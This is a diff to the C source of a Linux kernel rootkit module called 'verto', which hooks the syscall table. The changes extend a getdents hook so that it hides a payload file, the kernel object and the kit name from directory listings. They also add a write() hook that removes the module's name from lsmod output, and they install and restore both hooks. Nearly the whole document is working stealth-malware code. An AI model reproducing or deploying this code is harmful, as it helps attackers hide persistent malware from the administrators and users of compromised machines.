@@ -46,7 +46,7 @@ void DisablePageWriting(unsigned long address){
 	pte->pte = pte->pte &~ _PAGE_RW;
 } 
 
-//struct holds functions from 
+//struct from getdents man page (fills an array with this stuct data set one for each file in a traversed dir)
 struct linux_dirent {
 	unsigned long	  d_ino;    // Inode number 
 	unsigned long	  d_off;	  // Offset to next linux_dirent 
@@ -73,7 +73,7 @@ char payload[]="malware_demo_file.py"; //Rename to something 'common'
 
 //will live in usr/games
 char ko_fl[]  = "verto.ko"; //~ namley hide the kernel object file used to insert the kit
-
+char kit_name[] = "verto";
 // ------------------------------ //
 
 //                                                 - Original getdents System Call - 
@@ -84,7 +84,7 @@ asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dir
 //                                            - Modified/Redirected getdents System Call - 
 
 //Modified version of gedents, hooked from system call table -> pointed here
-asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
+asmlinkage int gedent_hook(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 
   struct linux_dirent *retn, *dirp3; 
   int Records, RemainingBytes, length;
@@ -111,7 +111,7 @@ asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned
 
     //TODO: ASSESS IF NEEDS EXTENDING
     //~files from globals above
-    if((strcmp( (dirp3->d_name) , payload) == 0) || (strcmp( (dirp3->d_name) , ko_fl) == 0)){
+    if((strcmp( (dirp3->d_name) , payload) == 0) || (strcmp( (dirp3->d_name), ko_fl) == 0) || (strcmp( (dirp3->d_name), kit_name) == 0)){
         memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
         Records -= length;
     }
@@ -129,24 +129,64 @@ asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned
 
 // ==================================================================================================================================
 
+// ================================================== SYSTEM HIDING FUNCTIONS  ======================================================
+
+//un-modified write function
+asmlinkage ssize_t(*original_write)(int fd, const void *buf, size_t count);
+
+asmlinkage ssize_t write_hook(int fd, const void *buf, size_t count){
+    char * temp_cc;
+    //ssize_t retn;
+
+    if(!strcmp(current->comm, "lsmod")){
+        //assign buf    
+        temp_cc = (char *) kmalloc(count, GFP_KERNEL);
+
+        //read the buffer of the current write call
+        copy_from_user(temp_cc, buf, count); //copy vars from user space
+
+        //determine if its our module that appears in the call
+        if(strstr(temp_cc, kit_name) != NULL){ //check for module in buf
+            //free mmemory (limited heavily in kernel land)
+            kfree(temp_cc);
+            
+            //return count without calling original write to 'skip' our kit
+            return count;
+        }
+    }
+    //if it is not our module write it
+    //retn = 
+    return original_write(fd, buf, count);
+    //return retn;
+}
+
+
+// ==================================================================================================================================
 
 // ====================================================== INSTALIZATION FUNCTIONS  ==================================================
 
 //TODO rename to encompass other functions
 static int __init SetHooks(void) { 
-	// instalize system call table variable, using call system to get the memory location
+	
+    
+    // instalize system call table variable, using call system to get the memory location
  	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 
     
     //DEBUGGING !REMOVE AFTER SUCCESSFUL DRYRUN!
 	printk(KERN_INFO "Hooks Will Be Set.\n");
 	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);
 
-  // Opens the memory pages to be written
+    // Opens the memory pages to be written
 	EnablePageWriting((unsigned long )SYS_CALL_TABLE);
 
-  // Replaces Pointer Of Syscall_open on our syscall.
+    // Replaces Pointer Of Syscall_open on our syscall
 	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
-	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
+	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)gedent_hook;
+
+    original_write = (void*)SYS_CALL_TABLE[__NR_write];
+    SYS_CALL_TABLE[__NR_write] = (unsigned long*)write_hook;
+
+    //closes pages after hooks
 	DisablePageWriting((unsigned long )SYS_CALL_TABLE);
 
 	return 0;
@@ -162,8 +202,16 @@ static void __exit HookCleanup(void) {
 
 	// Clean up our Hooks
 	EnablePageWriting((unsigned long )SYS_CALL_TABLE);
+
+
+
 	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
-	DisablePageWriting((unsigned long )SYS_CALL_TABLE);
+	SYS_CALL_TABLE[__NR_write] = (unsigned long*)original_write;
+    
+    
+    DisablePageWriting((unsigned long )SYS_CALL_TABLE);
+    
+    //DEBUGGING !REMOVE AFTER SUCCESSFUL DRYRUN!
 	printk(KERN_INFO "Hooks cleaned up");
 }
 
